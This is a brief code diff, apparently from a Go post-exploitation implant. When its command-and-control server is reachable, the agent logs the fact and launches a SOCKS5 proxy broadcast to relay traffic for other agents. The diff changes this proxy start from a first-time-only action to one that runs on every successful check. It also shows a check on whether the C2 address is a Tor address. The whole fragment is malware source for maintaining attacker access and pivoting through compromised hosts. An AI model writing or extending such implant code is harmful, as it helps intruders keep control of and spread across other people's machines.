@@ -189,11 +189,9 @@ test_agent:
 	checkInternet := func(cnt *int) bool {
 		if isC2Reachable() {
 			// if we do, we are feeling helpful
-			if *cnt == 0 {
-				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
-				ctx, cancel := context.WithCancel(context.Background())
-				go modules.StartBroadcast(true, ctx, cancel) // auto-proxy feature
-			}
+			log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
+			ctx, cancel := context.WithCancel(context.Background())
+			go modules.StartBroadcast(true, ctx, cancel) // auto-proxy feature
 			return true
 
 		} else if !netutil.IsTor(def.CCAddress) &&
